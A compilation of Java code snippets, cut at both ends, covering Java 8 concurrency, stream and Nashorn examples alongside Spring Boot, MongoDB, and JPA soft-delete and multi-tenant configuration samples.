        test1();
//        test2();
//        test3();

//        test4();
//        test5();
    }

    private static void test5() throws InterruptedException, ExecutionException {
        ExecutorService executor = Executors.newWorkStealingPool();

        List<Callable<String>> callables = Arrays.asList(
                callable("task1", 2),
                callable("task2", 1),
                callable("task3", 3));

        String result = executor.invokeAny(callables);
        System.out.println(result);

        executor.shutdown();
    }

    private static Callable<String> callable(String result, long sleepSeconds) {
        return () -> {
            TimeUnit.SECONDS.sleep(sleepSeconds);
            return result;
        };
    }

    private static void test4() throws InterruptedException {
        ExecutorService executor = Executors.newWorkStealingPool();

        List<Callable<String>> callables = Arrays.asList(
                () -> "task1",
                () -> "task2",
                () -> "task3");

        executor.invokeAll(callables)
                .stream()
                .map(future -> {
                    try {
                        return future.get();
                    }
                    catch (Exception e) {
                        throw new IllegalStateException(e);
                    }
                })
                .forEach(System.out::println);

        executor.shutdown();
    }

    private static void test3() {
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);

        Runnable task = () -> {
            try {
                TimeUnit.SECONDS.sleep(2);
                System.out.println("Scheduling: " + System.nanoTime());
            }
            catch (InterruptedException e) {
                System.err.println("task interrupted");
            }
        };

        executor.scheduleWithFixedDelay(task, 0, 1, TimeUnit.SECONDS);
    }

    private static void test2() {
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        Runnable task = () -> System.out.println("Scheduling: " + System.nanoTime());
        int initialDelay = 0;
        int period = 1;
        executor.scheduleAtFixedRate(task, initialDelay, period, TimeUnit.SECONDS);
    }

    private static void test1() throws InterruptedException {
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);

        Runnable task = () -> System.out.println("Scheduling: " + System.nanoTime());
        int delay = 3;
        ScheduledFuture<?> future = executor.schedule(task, delay, TimeUnit.SECONDS);

        TimeUnit.MILLISECONDS.sleep(1337);

        long remainingDelay = future.getDelay(TimeUnit.MILLISECONDS);
        System.out.printf("Remaining Delay: %sms\n", remainingDelay);
    }

}


import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.locks.StampedLock;

/**
 * @author Benjamin Winterberg
 */
public class Lock5 {

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(2);

        StampedLock lock = new StampedLock();

        executor.submit(() -> {
            long stamp = lock.tryOptimisticRead();
            try {
                System.out.println("Optimistic Lock Valid: " + lock.validate(stamp));
                ConcurrentUtils.sleep(1);
                System.out.println("Optimistic Lock Valid: " + lock.validate(stamp));
                ConcurrentUtils.sleep(2);
                System.out.println("Optimistic Lock Valid: " + lock.validate(stamp));
            } finally {
                lock.unlock(stamp);
            }
        });

        executor.submit(() -> {
            long stamp = lock.writeLock();
            try {
                System.out.println("Write Lock acquired");
                ConcurrentUtils.sleep(2);
            } finally {
                lock.unlock(stamp);
                System.out.println("Write done");
            }
        });

        ConcurrentUtils.stop(executor);
    }

}


import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.locks.StampedLock;

/**
 * @author Benjamin Winterberg
 */
public class Lock6 {

    private static int count = 0;

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(2);

        StampedLock lock = new StampedLock();

        executor.submit(() -> {
            long stamp = lock.readLock();
            try {
                if (count == 0) {
                    stamp = lock.tryConvertToWriteLock(stamp);
                    if (stamp == 0L) {
                        System.out.println("Could not convert to write lock");
                        stamp = lock.writeLock();
                    }
                    count = 23;
                }
                System.out.println(count);
            } finally {
                lock.unlock(stamp);
            }
        });

        ConcurrentUtils.stop(executor);
    }

}




import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.stream.IntStream;

/**
 * @author Benjamin Winterberg
 */
public class Semaphore2 {

    private static Semaphore semaphore = new Semaphore(5);

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(10);

        IntStream.range(0, 10)
                .forEach(i -> executor.submit(Semaphore2::doWork));

        ConcurrentUtils.stop(executor);
    }

    private static void doWork() {
        boolean permit = false;
        try {
            permit = semaphore.tryAcquire(1, TimeUnit.SECONDS);
            if (permit) {
                System.out.println("Semaphore acquired");
                ConcurrentUtils.sleep(5);
            } else {
                System.out.println("Could not acquire semaphore");
            }
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        } finally {
            if (permit) {
                semaphore.release();
            }
        }
    }

}




import jdk.nashorn.api.scripting.NashornScriptEngine;

import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.util.concurrent.TimeUnit;

/**
 * @author Benjamin Winterberg
 */
public class Nashorn9 {

    public static void main(String[] args) throws ScriptException, NoSuchMethodException {
        NashornScriptEngine engine = (NashornScriptEngine) new ScriptEngineManager().getEngineByName("nashorn");
        engine.eval("load('res/nashorn9.js')");

        long t0 = System.nanoTime();

        double result = 0;
        for (int i = 0; i < 1000; i++) {
            double num = (double) engine.invokeFunction("testPerf");
            result += num;
        }

        System.out.println(result > 0);

        long took = System.nanoTime() - t0;
        System.out.format("Elapsed time: %d ms", TimeUnit.NANOSECONDS.toMillis(took));
    }
}




import com.winterbe.java8.samples.lambda.Person;
import jdk.nashorn.api.scripting.NashornScriptEngine;

import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

/**
 * @author Benjamin Winterberg
 */
public class Nashorn8 {
    public static void main(String[] args) throws ScriptException, NoSuchMethodException {
        NashornScriptEngine engine = (NashornScriptEngine) new ScriptEngineManager().getEngineByName("nashorn");
        engine.eval("load('res/nashorn8.js')");

        engine.invokeFunction("evaluate1");                             // [object global]
        engine.invokeFunction("evaluate2");                             // [object Object]
        engine.invokeFunction("evaluate3", "Foobar");                   // Foobar
        engine.invokeFunction("evaluate3", new Person("John", "Doe"));  // [object global] <- ???????
    }

}



import javax.script.Invocable;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

/**
 * @author Benjamin Winterberg
 */
public class Nashorn7 {

    public static class Person {
        private String name;

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getLengthOfName() {
            return name.length();
        }
    }

    public static void main(String[] args) throws ScriptException, NoSuchMethodException {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
        engine.eval("function foo(predicate, obj) { return !!(eval(predicate)); };");

        Invocable invocable = (Invocable) engine;

        Person person = new Person();
        person.setName("Hans");

        String predicate = "obj.getLengthOfName() >= 4";
        Object result = invocable.invokeFunction("foo", predicate, person);
        System.out.println(result);
    }

}
import java.util.Arrays;
import java.util.IntSummaryStatistics;
import java.util.List;
import java.util.Map;
import java.util.StringJoiner;
import java.util.stream.Collector;
import java.util.stream.Collectors;

/**
 * @author Benjamin Winterberg
 */
public class Streams10 {

    static class Person {
        String name;
        int age;

        Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        @Override
        public String toString() {
            return name;
        }
    }

    public static void main(String[] args) {
        List<Person> persons =
            Arrays.asList(
                new Person("Max", 18),
                new Person("Peter", 23),
                new Person("Pamela", 23),
                new Person("David", 12));

//        test1(persons);
//        test2(persons);
//        test3(persons);
//        test4(persons);
//        test5(persons);
//        test6(persons);
//        test7(persons);
//        test8(persons);
        test9(persons);
    }

    private static void test1(List<Person> persons) {
        List<Person> filtered =
            persons
                .stream()
                .filter(p -> p.name.startsWith("P"))
                .collect(Collectors.toList());

        System.out.println(filtered);    // [Peter, Pamela]
    }

    private static void test2(List<Person> persons) {
        Map<Integer, List<Person>> personsByAge = persons
            .stream()
            .collect(Collectors.groupingBy(p -> p.age));

        personsByAge
            .forEach((age, p) -> System.out.format("age %s: %s\n", age, p));

        // age 18: [Max]
        // age 23:[Peter, Pamela]
        // age 12:[David]
    }

    private static void test3(List<Person> persons) {
        Double averageAge = persons
            .stream()
            .collect(Collectors.averagingInt(p -> p.age));

        System.out.println(averageAge);     // 19.0
    }

    private static void test4(List<Person> persons) {
        IntSummaryStatistics ageSummary =
            persons
                .stream()
                .collect(Collectors.summarizingInt(p -> p.age));

        System.out.println(ageSummary);
        // IntSummaryStatistics{count=4, sum=76, min=12, average=19,000000, max=23}
    }

    private static void test5(List<Person> persons) {
        String names = persons
            .stream()
            .filter(p -> p.age >= 18)
            .map(p -> p.name)
            .collect(Collectors.joining(" and ", "In Germany ", " are of legal age."));

        System.out.println(names);
        // In Germany Max and Peter and Pamela are of legal age.
    }

    private static void test6(List<Person> persons) {
        Map<Integer, String> map = persons
            .stream()
            .collect(Collectors.toMap(
                p -> p.age,
                p -> p.name,
                (name1, name2) -> name1 + ";" + name2));

        System.out.println(map);
        // {18=Max, 23=Peter;Pamela, 12=David}
    }

    private static void test7(List<Person> persons) {
        Collector<Person, StringJoiner, String> personNameCollector =
            Collector.of(
                () -> new StringJoiner(" | "),          // supplier
                (j, p) -> j.add(p.name.toUpperCase()),  // accumulator
                (j1, j2) -> j1.merge(j2),               // combiner
                StringJoiner::toString);                // finisher

        String names = persons
            .stream()
            .collect(personNameCollector);

        System.out.println(names);  // MAX | PETER | PAMELA | DAVID
    }

    private static void test8(List<Person> persons) {
        Collector<Person, StringJoiner, String> personNameCollector =
            Collector.of(
                () -> {
                    System.out.println("supplier");
                    return new StringJoiner(" | ");
                },
                (j, p) -> {
                    System.out.format("accumulator: p=%s; j=%s\n", p, j);
                    j.add(p.name.toUpperCase());
                },
                (j1, j2) -> {
                    System.out.println("merge");
                    return j1.merge(j2);
                },
                j -> {
                    System.out.println("finisher");
                    return j.toString();
                });

        String names = persons
            .stream()
            .collect(personNameCollector);

        System.out.println(names);  // MAX | PETER | PAMELA | DAVID
    }

    private static void test9(List<Person> persons) {
        Collector<Person, StringJoiner, String> personNameCollector =
            Collector.of(
                () -> {
                    System.out.println("supplier");
                    return new StringJoiner(" | ");
                },
                (j, p) -> {
                    System.out.format("accumulator: p=%s; j=%s\n", p, j);
                    j.add(p.name.toUpperCase());
                },
                (j1, j2) -> {
                    System.out.println("merge");
                    return j1.merge(j2);
                },
                j -> {
                    System.out.println("finisher");
                    return j.toString();
                });

        String names = persons
            .parallelStream()
            .collect(personNameCollector);

        System.out.println(names);  // MAX | PETER | PAMELA | DAVID
    }
}

import java.util.Arrays;
import java.util.List;

/**
 * @author Benjamin Winterberg
 */
public class Streams11 {

    static class Person {
        String name;
        int age;

        Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        @Override
        public String toString() {
            return name;
        }
    }

    public static void main(String[] args) {
        List<Person> persons =
            Arrays.asList(
                new Person("Max", 18),
                new Person("Peter", 23),
                new Person("Pamela", 23),
                new Person("David", 12));

//        test1(persons);
//        test2(persons);
//        test3(persons);
//        test4(persons);
//        test5(persons);
        test6(persons);
    }

    private static void test1(List<Person> persons) {
        persons
            .stream()
            .reduce((p1, p2) -> p1.age > p2.age ? p1 : p2)
            .ifPresent(System.out::println);    // Pamela
    }

    private static void test2(List<Person> persons) {
        Person result =
            persons
                .stream()
                .reduce(new Person("", 0), (p1, p2) -> {
                    p1.age += p2.age;
                    p1.name += p2.name;
                    return p1;
                });

        System.out.format("name=%s; age=%s", result.name, result.age);
    }

    private static void test3(List<Person> persons) {
        Integer ageSum = persons
            .stream()
            .reduce(0, (sum, p) -> sum += p.age, (sum1, sum2) -> sum1 + sum2);

        System.out.println(ageSum);
    }

    private static void test4(List<Person> persons) {
        Integer ageSum = persons
            .stream()
            .reduce(0,
                (sum, p) -> {
                    System.out.format("accumulator: sum=%s; person=%s\n", sum, p);
                    return sum += p.age;
                },
                (sum1, sum2) -> {
                    System.out.format("combiner: sum1=%s; sum2=%s\n", sum1, sum2);
                    return sum1 + sum2;
                });

        System.out.println(ageSum);
    }

    private static void test5(List<Person> persons) {
        Integer ageSum = persons
            .parallelStream()
            .reduce(0,
                (sum, p) -> {
                    System.out.format("accumulator: sum=%s; person=%s\n", sum, p);
                    return sum += p.age;
                },
                (sum1, sum2) -> {
                    System.out.format("combiner: sum1=%s; sum2=%s\n", sum1, sum2);
                    return sum1 + sum2;
                });

        System.out.println(ageSum);
    }

    private static void test6(List<Person> persons) {
        Integer ageSum = persons
            .parallelStream()
            .reduce(0,
                (sum, p) -> {
                    System.out.format("accumulator: sum=%s; person=%s; thread=%s\n",
                        sum, p, Thread.currentThread().getName());
                    return sum += p.age;
                },
                (sum1, sum2) -> {
                    System.out.format("combiner: sum1=%s; sum2=%s; thread=%s\n",
                        sum1, sum2, Thread.currentThread().getName());
                    return sum1 + sum2;
                });

        System.out.println(ageSum);
    }
}
import java.util.ArrayList;
import java.util.List;
import java.util.stream.IntStream;

/**
 * @author Benjamin Winterberg
 */
public class Streams7 {

    static class Foo {
        String name;
        List<Bar> bars = new ArrayList<>();

        Foo(String name) {
            this.name = name;
        }
    }

    static class Bar {
        String name;

        Bar(String name) {
            this.name = name;
        }
    }

    public static void main(String[] args) {
//        test1();
        test2();
    }

    static void test2() {
        IntStream.range(1, 4)
            .mapToObj(num -> new Foo("Foo" + num))
            .peek(f -> IntStream.range(1, 4)
                .mapToObj(num -> new Bar("Bar" + num + " <- " + f.name))
                .forEach(f.bars::add))
            .flatMap(f -> f.bars.stream())
            .forEach(b -> System.out.println(b.name));
    }

    static void test1() {
        List<Foo> foos = new ArrayList<>();

        IntStream
            .range(1, 4)
            .forEach(num -> foos.add(new Foo("Foo" + num)));

        foos.forEach(f ->
            IntStream
                .range(1, 4)
                .forEach(num -> f.bars.add(new Bar("Bar" + num + " <- " + f.name))));

        foos.stream()
            .flatMap(f -> f.bars.stream())
            .forEach(b -> System.out.println(b.name));
    }

}
public class ConcurrentUtils {

    public static void stop(ExecutorService executor) {
        try {
            executor.shutdown();
            executor.awaitTermination(60, TimeUnit.SECONDS);
        }
        catch (InterruptedException e) {
            System.err.println("termination interrupted");
        }
        finally {
            if (!executor.isTerminated()) {
                System.err.println("killing non-finished tasks");
            }
            executor.shutdownNow();
        }
    }

    public static void sleep(int seconds) {
        try {
            TimeUnit.SECONDS.sleep(seconds);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
    }

}

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.locks.ReentrantLock;
import java.util.stream.IntStream;

/**
 * @author Benjamin Winterberg
 */
public class Lock1 {

    private static final int NUM_INCREMENTS = 10000;

    private static ReentrantLock lock = new ReentrantLock();

    private static int count = 0;

    private static void increment() {
        lock.lock();
        try {
            count++;
        } finally {
            lock.unlock();
        }
    }

    public static void main(String[] args) {
        testLock();
    }

    private static void testLock() {
        count = 0;

        ExecutorService executor = Executors.newFixedThreadPool(2);

        IntStream.range(0, NUM_INCREMENTS)
                 .forEach(i -> executor.submit(Lock1::increment));

        ConcurrentUtils.stop(executor);

        System.out.println(count);
    }
}
----------------------------------------------------------------------------------------
import org.springframework.context.annotation.Condition;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.core.env.Environment;
import org.springframework.core.type.AnnotatedTypeMetadata;
import org.springframework.util.StringUtils;

/**
 * BasicServiceCondition
 * 
 * @author 	alanwei
 * @since 	2016-09-16
 */
public class BasicServiceConfigCondition implements Condition {

	/**
	 * match [motan.basicservice.exportPort, motan.basicservice.export] config property
	 * 
	 * @see org.springframework.context.annotation.Condition#matches(org.springframework.context.annotation.ConditionContext, org.springframework.core.type.AnnotatedTypeMetadata)
	 */
	@Override
	public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
		Environment env = context.getEnvironment();
		return (!StringUtils.isEmpty(env.getProperty("motan.basicservice.exportPort"))
				|| !StringUtils.isEmpty(env.getProperty("motan.basicservice.export")));
	}
}
----------------------------------------------------------------------------------------

    @Order(Ordered.HIGHEST_PRECEDENCE+1000)
    @Bean
    CommandLineRunner argProcessingCommandLineRunner() {
        return (args) -> {
            //filter optionArgs (processed by te spring boot) - logic from {@link SimpleCommandLineArgsParser#parse}
            args = Stream.of(args).filter(arg -> !arg.startsWith("--")).toArray(String[]::new);

            // do with args whatever we need -> for example print them
            Stream.of(args).forEach(arg -> logger.info("On of the input args is: {}", arg));
        };
    }

    @Order(Ordered.LOWEST_PRECEDENCE-1000)
    @Bean
    CommandLineRunner processBeforeStart(PersonRepository personRepository) {
        return (callback) -> Arrays.asList("Panda Makrova:5;Wanda Trollowa:63;Sigma Alfova:18".split(";")).forEach(
                entry -> {
                    String[] nameAndAge = entry.split(":");
                    String name = nameAndAge[0];
                    String age = nameAndAge[1];
                    Person person = Person.getFactory().create(name, Integer.valueOf(age));
                    personRepository.save(person);
                    logger.info("Person {} inserted to DB", person);
                }
        );
    }


    @Before
    public void createTestFile() throws Exception {
        destination_file = File.createTempFile("test-poi-spring-boot", ".xlsx");
        destination_file.createNewFile();

        sourceFile = File.createTempFile("test-poi-spring-boot-source", ".txt");
        sourceFile.createNewFile();

        FileOutputStream fos = new FileOutputStream(sourceFile);
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(fos));

        for (int i = 0; i < ROWS_TO_GENERATE; i++) {
            bw.write(UUID.randomUUID().toString());
            bw.newLine();
        }

        bw.close();

        destination_file.deleteOnExit();
        sourceFile.deleteOnExit();
    }
	
import org.springframework.security.core.userdetails.User;
import org.springframework.security.web.bind.annotation.AuthenticationPrincipal;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.thymeleaf.spring.support.Layout;

@Controller
public class SecurityController {

    @RequestMapping({"/", "/home"})
    public String home(final Model model) {
        return "home";
    }

    @Layout("layouts/logged_in")
    @RequestMapping("/hello")
    public String hello(@AuthenticationPrincipal User user, final Model model) {
        model.addAttribute("name", user.getUsername());
        return "hello";
    }

    @RequestMapping("/login")
    public String login(final Model model) {
        return "login";
    }
}
----------------------------------------------------------------------------------------
    @Bean
    public EmbeddedServletContainerCustomizer containerCustomizer() {
        return factory -> {
            TomcatEmbeddedServletContainerFactory containerFactory = (TomcatEmbeddedServletContainerFactory) factory;
            containerFactory.setTomcatContextCustomizers(Arrays.asList(context -> {
                final PersistentManager persistentManager = new PersistentManager();
                final FileStore store = new FileStore();

                final String sessionDirectory = makeSessionDirectory();
                log.info("Writing sessions to " + sessionDirectory);
                store.setDirectory(sessionDirectory);

                persistentManager.setStore(store);
                context.setManager(persistentManager);
            }));
        };
    }
----------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.Sort;
import org.springframework.data.mongodb.core.MongoOperations;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.stereotype.Repository;

import com.example.domain.Post;

@Repository
public class PostDAO {

	@Autowired
	MongoOperations mongoTemplate;

	public void savePost(Post post) {
		mongoTemplate.save(post);
	}
	
	public void deletePost(Post post) {
		mongoTemplate.remove(post);
	}

	public List<Post> getAllPosts() {
		//new mongodb query
		Query query = new Query();
		//sort by date
		query.with(new Sort(Sort.Direction.DESC,"date"));
		//run query
		ArrayList<Post> allPostList = (ArrayList<Post>) mongoTemplate
				.find(query, (Post.class));
		return allPostList;
	}
	
	public List<Post> getAllUsersPosts(String user) {
		//find post by user
		Query query = new Query(Criteria.where("user").is(user));	
		//sort by date
		query.with(new Sort(Sort.Direction.DESC,"date"));
		//run query
		ArrayList<Post> allPostList = (ArrayList<Post>) mongoTemplate
				.find(query, (Post.class));
		return allPostList;
	}

	public Post getPostById(String id) {
		Query query = new Query(Criteria.where("_id").is(id));
		Post post = (Post) mongoTemplate.findOne(query, (Post.class));
		return post;
	}
}
----------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;

import javax.persistence.Entity;
import javax.persistence.EntityManagerFactory;
import javax.persistence.metamodel.ManagedType;
import javax.persistence.metamodel.Metamodel;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.rest.core.config.RepositoryRestConfiguration;
import org.springframework.data.rest.webmvc.config.RepositoryRestConfigurerAdapter;

import com.kristijangeorgiev.softdelete.model.entity.PermissionRole;
import com.kristijangeorgiev.softdelete.model.entity.RoleUser;
import com.kristijangeorgiev.softdelete.model.entity.pk.PermissionRolePK;
import com.kristijangeorgiev.softdelete.model.entity.pk.RoleUserPK;
import com.kristijangeorgiev.softdelete.repository.PermissionRoleRepository;
import com.kristijangeorgiev.softdelete.repository.RoleUserRepository;

/**
 * 
 * <h2>CustomRepositoryRestConfigurerAdapter</h2>
 * 
 * @author Kristijan Georgiev
 *
 */

@Configuration
public class CustomRepositoryRestConfigurerAdapter extends RepositoryRestConfigurerAdapter {

	@Autowired
	private EntityManagerFactory entityManagerFactory;

	@Override
	public void configureRepositoryRestConfiguration(RepositoryRestConfiguration config) {

		// PermissionRole Entity
		config.withEntityLookup().forRepository(PermissionRoleRepository.class, (PermissionRole entity) -> {
			return new PermissionRolePK(entity.getPermissionId(), entity.getRoleId());
		}, PermissionRoleRepository::findOne);

		// RoleUser Entity
		config.withEntityLookup().forRepository(RoleUserRepository.class, (RoleUser entity) -> {
			return new RoleUserPK(entity.getRoleId(), entity.getUserId());
		}, RoleUserRepository::findOne);

		List<Class<?>> entityClasses = getAllManagedEntityTypes(entityManagerFactory);

		// Expose id's for all entity classes
		for (Class<?> entityClass : entityClasses)
			config.exposeIdsFor(entityClass);

		// Return newly created entities in the response
		config.setReturnBodyOnCreate(true);

		// Return updated entities in the response
		config.setReturnBodyOnUpdate(true);
	}

	// Find all classes that are annotated with @Entity
	private List<Class<?>> getAllManagedEntityTypes(EntityManagerFactory entityManagerFactory) {
		List<Class<?>> entityClasses = new ArrayList<>();
		Metamodel metamodel = entityManagerFactory.getMetamodel();

		for (ManagedType<?> managedType : metamodel.getManagedTypes())
			if (managedType.getJavaType().isAnnotationPresent(Entity.class))
				entityClasses.add(managedType.getJavaType());

		return entityClasses;
	}
}
----------------------------------------------------------------------------------------
import java.io.Serializable;

import javax.persistence.EntityManager;

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.support.JpaRepositoryFactory;
import org.springframework.data.jpa.repository.support.JpaRepositoryFactoryBean;
import org.springframework.data.repository.core.RepositoryInformation;
import org.springframework.data.repository.core.RepositoryMetadata;
import org.springframework.data.repository.core.support.RepositoryFactorySupport;

import com.kristijangeorgiev.softdelete.repository.SoftDeletesRepositoryImpl;

/**
 * 
 * @author Kristijan Georgiev
 * 
 *         Returns the custom repository implementation for the soft deletes
 */

public class CustomJpaRepositoryFactoryBean<T extends JpaRepository<S, ID>, S, ID extends Serializable>
		extends JpaRepositoryFactoryBean<T, S, ID> {

	public CustomJpaRepositoryFactoryBean(Class<? extends T> repositoryInterface) {
		super(repositoryInterface);
	}

	@Override
	protected RepositoryFactorySupport createRepositoryFactory(EntityManager entityManager) {
		return new CustomJpaRepositoryFactory<T, ID>(entityManager);
	}

	private static class CustomJpaRepositoryFactory<T, ID extends Serializable> extends JpaRepositoryFactory {

		private final EntityManager entityManager;

		public CustomJpaRepositoryFactory(EntityManager entityManager) {
			super(entityManager);
			this.entityManager = entityManager;
		}

		@Override
		@SuppressWarnings("unchecked")
		protected Object getTargetRepository(RepositoryInformation information) {
			return new SoftDeletesRepositoryImpl<T, ID>((Class<T>) information.getDomainType(), entityManager);
		}

		@Override
		protected Class<?> getRepositoryBaseClass(RepositoryMetadata metadata) {
			return SoftDeletesRepositoryImpl.class;
		}
	}
}

import java.util.List;

import javax.persistence.CascadeType;
import javax.persistence.Entity;
import javax.persistence.JoinColumn;
import javax.persistence.JoinTable;
import javax.persistence.ManyToMany;
import javax.persistence.OneToMany;
import javax.persistence.Table;
import javax.persistence.UniqueConstraint;
import javax.validation.constraints.NotNull;
import javax.validation.constraints.Size;

import org.hibernate.annotations.Where;
import org.hibernate.annotations.WhereJoinTable;
import org.springframework.context.annotation.Lazy;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;

import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.NoArgsConstructor;
import lombok.ToString;

/**
 * 
 * <h2>Role</h2>
 * 
 * @author Kristijan Georgiev
 * 
 *         Role entity
 *
 */

@Data
@Entity
@NoArgsConstructor
@EqualsAndHashCode(callSuper = true)
@JsonIgnoreProperties(ignoreUnknown = true)
@Table(uniqueConstraints = { @UniqueConstraint(columnNames = { "code" }) })
@ToString(exclude = { "roleUsers", "permissionRole", "users", "permissions" })
public class Role extends BaseIdEntity {

	private static final long serialVersionUID = 1L;

	@NotNull
	@Size(min = 1, max = 255)
	private String code;

	@NotNull
	@Size(min = 1, max = 255)
	private String name;

	@Size(min = 1, max = 255)
	private String description;

	@Lazy
	@OneToMany(mappedBy = "role")
	@Where(clause = NOT_DELETED)
	private List<RoleUser> roleUsers;

	@Lazy
	@OneToMany(mappedBy = "role")
	@Where(clause = NOT_DELETED)
	private List<PermissionRole> permissionRole;

	@Lazy
	@Where(clause = NOT_DELETED)
	@WhereJoinTable(clause = NOT_DELETED)
	@ManyToMany(mappedBy = "roles", cascade = CascadeType.DETACH)
	private List<User> users;

	/*
	 * Get all permissions associated with the Role that are not deleted
	 */
	@Lazy
	@Where(clause = NOT_DELETED)
	@WhereJoinTable(clause = NOT_DELETED)
	@ManyToMany(cascade = CascadeType.ALL)
	@JoinTable(name = "permission_role", joinColumns = {
			@JoinColumn(name = "role_id", referencedColumnName = "id") }, inverseJoinColumns = {
					@JoinColumn(name = "permission_id", referencedColumnName = "id") })
	private List<Permission> permissions;
}
----------------------------------------------------------------------------------------
import java.util.List;

import javax.persistence.CascadeType;
import javax.persistence.Entity;
import javax.persistence.ManyToMany;
import javax.persistence.OneToMany;
import javax.persistence.Table;
import javax.persistence.UniqueConstraint;
import javax.validation.constraints.NotNull;
import javax.validation.constraints.Size;

import org.hibernate.annotations.Where;
import org.hibernate.annotations.WhereJoinTable;
import org.springframework.context.annotation.Lazy;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;

import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.NoArgsConstructor;
import lombok.ToString;

/**
 * 
 * <h2>Permission</h2>
 * 
 * @author Kristijan Georgiev
 * 
 *         Permission entity
 *
 */

@Data
@Entity
@NoArgsConstructor
@EqualsAndHashCode(callSuper = true)
@JsonIgnoreProperties(ignoreUnknown = true)
@ToString(exclude = { "roles", "permissionRoles" })
@Table(uniqueConstraints = { @UniqueConstraint(columnNames = { "code" }) })
public class Permission extends BaseIdEntity {

	private static final long serialVersionUID = 1L;

	@NotNull
	@Size(min = 1, max = 255)
	private String name;

	@NotNull
	@Size(min = 1, max = 255)
	private String code;

	@Lazy
	@Where(clause = NOT_DELETED)
	@WhereJoinTable(clause = NOT_DELETED)
	@ManyToMany(mappedBy = "permissions", cascade = CascadeType.DETACH)
	private List<Role> roles;

	@Lazy
	@Where(clause = NOT_DELETED)
	@OneToMany(mappedBy = "permission")
	private List<PermissionRole> permissionRoles;

}

import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.IdClass;
import javax.persistence.JoinColumn;
import javax.persistence.ManyToOne;

import org.hibernate.annotations.Where;
import org.springframework.context.annotation.Lazy;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.kristijangeorgiev.softdelete.model.entity.pk.RoleUserPK;

import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.NoArgsConstructor;
import lombok.ToString;

/**
 * 
 * <h2>RoleUser</h2>
 * 
 * @author Kristijan Georgiev
 * 
 *         RoleUser association entity
 *
 */

@Data
@Entity
@NoArgsConstructor
@IdClass(RoleUserPK.class)
@EqualsAndHashCode(callSuper = true)
@JsonIgnoreProperties(ignoreUnknown = true)
@ToString(exclude = { "role", "user" })
public class RoleUser extends BaseEntity {

	private static final long serialVersionUID = 1L;

	@Id
	@Column(name = "role_id")
	private Long roleId;

	@Id
	@Column(name = "user_id")
	private Long userId;

	@Lazy
	@ManyToOne
	@Where(clause = NOT_DELETED)
	@JoinColumn(name = "role_id", referencedColumnName = "id", insertable = false, updatable = false)
	private Role role;

	@Lazy
	@ManyToOne
	@Where(clause = NOT_DELETED)
	@JoinColumn(name = "user_id", referencedColumnName = "id", insertable = false, updatable = false)
	private User user;

}
----------------------------------------------------------------------------------------
import org.hibernate.MultiTenancyStrategy;
import org.hibernate.cfg.Environment;
import org.hibernate.context.spi.CurrentTenantIdentifierResolver;
import org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.orm.jpa.JpaProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.orm.jpa.JpaVendorAdapter;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;

import java.util.HashMap;
import java.util.Map;

import javax.sql.DataSource;

@Configuration
public class HibernateConfig {

  @Autowired
  private JpaProperties jpaProperties;

  @Bean
  public JpaVendorAdapter jpaVendorAdapter() {
    return new HibernateJpaVendorAdapter();
  }

  @Bean
  public LocalContainerEntityManagerFactoryBean entityManagerFactory(DataSource dataSource,
      MultiTenantConnectionProvider multiTenantConnectionProviderImpl,
      CurrentTenantIdentifierResolver currentTenantIdentifierResolverImpl) {
    Map<String, Object> properties = new HashMap<>();
    properties.putAll(jpaProperties.getHibernateProperties(dataSource));
    properties.put(Environment.MULTI_TENANT, MultiTenancyStrategy.SCHEMA);
    properties.put(Environment.MULTI_TENANT_CONNECTION_PROVIDER, multiTenantConnectionProviderImpl);
    properties.put(Environment.MULTI_TENANT_IDENTIFIER_RESOLVER, currentTenantIdentifierResolverImpl);

    LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
    em.setDataSource(dataSource);
    em.setPackagesToScan("com.srai");
